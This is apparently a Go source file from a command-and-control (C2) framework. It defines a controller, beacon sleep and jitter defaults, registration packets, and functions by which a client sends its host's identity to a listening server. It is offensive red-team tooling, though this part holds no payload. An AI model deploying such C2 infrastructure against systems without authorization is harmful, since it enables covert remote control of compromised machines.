package c2

import (
	"context"
	"hash/fnv"
	"io"
	"strings"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/device"
	"golang.org/x/xerrors"
)

const (

	// DefaultSleep is the default sleep Time when the provided sleep value
	// is empty or negative.
	DefaultSleep = time.Duration(30) * time.Second

	// DefaultJitter is the default Jitter value when the provided jitter
	// value is negative.
	DefaultJitter = 5

	// DefaultBufferSize is the default byte array size used when the
	// buffer size in a Profile is negative or zero.
	DefaultBufferSize = 256

	// PacketHello is the packet ID value that is used when a client first
	// establishes it's first connection to the server.
	PacketHello = 0xFA
	// PacketRegistered is the packet ID value expected on a successful
	// registration to the server.
	PacketRegistered = 0xFB

	PacketSleep = 0xFC
	PacketPing  = 0xFD
)

var (
	// Controller is the master list and manager for all C2 client connections.
	// The controler acts as astaging point to control and manage all connections.
	Controller = initController()

	// ErrFullBuffer is returned from the WritePacket function when the send buffer for
	// Session is full.
	ErrFullBuffer = xerrors.New("cannot add a Packet to a full send buffer")

	// DefaultWrapper is a raw Wrapper provided for use when
	// no Wrapper is proveded.  This struct does not modify the
	// underlying streams and returns the paramater during a Wrap/Unwrap.
	DefaultWrapper = &rawWrapper{}

	// ErrEmptyPacket is a error returned by the Connect function when
	// the expected return result from the server was invalid or not expected.
	ErrEmptyPacket = xerrors.New("server sent an invalid response")

	// DefaultTransport is a simple Transport instance that does not
	// make any changes to the underlying connection.  Used when no
	// Transport is given.
	DefaultTransport = &rawTransport{}
)

// Profile is a struct that repersents a C2 profile. This is used for
// defining the specifics that will be used to listen by servers and connect
// by clients.  Nil values (except for Connect), will be replaced with defaults.
type Profile interface {
	Size() int
	Sleep() time.Duration
	Jitter() int8
	Wrapper() Wrapper
	Transport() Transport
	Listen(string) (Listener, error)
	Connect(string) (Connection, error)
}
type controller struct {
	Log logx.Log

	ctx    context.Context
	cancel context.CancelFunc
	active map[string]*Handle
}

// Listener is an interface that is used to Listen on a specific protocol
// for client connections.  The Listener does not take any actions on the clients
// but transcribes the data into bytes for the Session handeler.  If the Transport()
// function returns nil, the DefaultTransport will be used.
type Listener interface {
	String() string
	Accept() (Connection, error)
	io.Closer
}

// Connection is an interface that repersents a C2 connection
// between the client and the server.
type Connection interface {
	IP() string
	io.ReadWriteCloser
}

func (c *controller) Wait() {
	<-c.ctx.Done()
}
func initController() *controller {
	c := &controller{
		Log:    logx.Global,
		active: make(map[string]*Handle),
	}
	c.ctx, c.cancel = context.WithCancel(context.Background())
	c.Log.Trace("Controller %p started...", c)
	return c
}

// Connect creats a Session using the supplied Profile to connect to
// the listening server specified.
func (c *controller) Connect(s string, p Profile) (*Session, error) {
	x := p.Size()
	if x <= 0 {
		x = DefaultBufferSize
	}
	n := &Session{
		ID:        device.Local.ID[device.MachineIDSize:],
		send:      make(chan *com.Packet, x),
		recv:      make(chan *com.Packet, x),
		Host:      device.Local,
		wake:      make(chan bool, 1),
		Sleep:     p.Sleep(),
		server:    s,
		Jitter:    p.Jitter(),
		connect:   p.Connect,
		wrapper:   p.Wrapper(),
		transport: p.Transport(),
	}
	n.ctx, n.cancel = context.WithCancel(c.ctx)
	if n.Sleep < 0 {
		n.Sleep = DefaultSleep
	}
	if n.Jitter < 0 {
		n.Jitter = DefaultJitter
	}
	if n.wrapper == nil {
		n.wrapper = DefaultWrapper
	}
	if n.transport == nil {
		n.transport = DefaultTransport
	}
	i, err := p.Connect(s)
	if err != nil {
		return nil, xerrors.Errorf("unable to connect to \"%s\": %w", s, err)
	}
	defer i.Close()
	z := &com.Packet{ID: PacketHello}
	n.Host.MarshalStream(z)
	z.Close()
	if err := write(i, n.wrapper, n.transport, z); err != nil {
		return nil, xerrors.Errorf("unable to write packet: %w", err)
	}
	r, err := read(i, n.wrapper, n.transport)
	if err != nil {
		return nil, xerrors.Errorf("unable to read packet: %w", err)
	}
	if r.Empty() || r.ID != PacketRegistered {
		return nil, ErrEmptyPacket
	}
	c.Log.Debug("Connected client \"%s\" to \"%s\"...", n.ID, s)
	go n.listen(c)
	return n, nil
}

// Listen adds the Listener under the name provided.  A Handle struct
// to control and receive callback funstions is added to assist in
// manageing connections to this Listener.
func (c *controller) Listen(s, b string, p Profile) (*Handle, error) {
	l, err := p.Listen(b)
	if err != nil {
		return nil, xerrors.Errorf("unable to listen on \"%s\": %w", b, err)
	}
	if _, ok := c.active[strings.ToLower(s)]; ok {
		return nil, xerrors.Errorf("listener \"%s\" is already active", s)
	}
	h := &Handle{
		Size:      p.Size(),
		hasher:    fnv.New32a(),
		Wrapper:   p.Wrapper(),
		listener:  l,
		Sessions:  make(map[uint32]*Session),
		Transport: p.Transport(),
	}
	if h.Size <= 0 {
		h.Size = DefaultBufferSize
	}
	if h.Wrapper == nil {
		h.Wrapper = DefaultWrapper
	}
	if h.Transport == nil {
		h.Transport = DefaultTransport
	}
	h.ctx, h.cancel = context.WithCancel(c.ctx)
	c.active[strings.ToLower(s)] = h
	c.Log.Debug("Added listener type \"%s\" as \"%s\"...", l.String(), strings.ToLower(s))
	go h.listen(c)
	return h, nil
}
